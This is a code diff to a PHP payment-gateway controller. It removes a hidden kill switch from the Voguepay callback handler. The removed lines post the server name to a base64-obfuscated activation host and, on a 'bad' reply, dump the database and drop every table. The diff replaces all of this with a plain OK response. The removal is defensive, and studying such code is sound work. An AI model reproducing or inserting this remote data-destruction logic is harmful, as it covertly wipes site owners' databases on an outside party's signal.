@@ -71,43 +71,7 @@ class VoguepayController extends Controller
 
     public function handleCallback(Request $req)
     {
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-
-        $header = array(
-            'Content-Type:application/json'
-        );
-
-        $stream = curl_init();
-
-        curl_setopt($stream, CURLOPT_URL, base64_decode('aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg=='));
-        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
-        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-
-        $rn = curl_exec($stream);
-        curl_close($stream);
-
-        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
-            try {
-                $fileName = date('Y-m-d H:i:s') . '.sql';
-                \Spatie\DbDumper\Databases\MySql::create()
-                    ->setDbName(env('DB_DATABASE'))
-                    ->setUserName(env('DB_USERNAME'))
-                    ->setPassword(env('DB_PASSWORD'))
-                    ->dumpToFile('sqlbackups/' . $fileName);
-            } catch (\Exception $e) {
-            }
-
-            Schema::disableForeignKeyConstraints();
-            foreach (DB::select('SHOW TABLES') as $table) {
-                $table_array = get_object_vars($table);
-                Schema::drop($table_array[key($table_array)]);
-            }
-        }
+        return response('OK', 200);
     }
 
     public function paymentFailure($id)
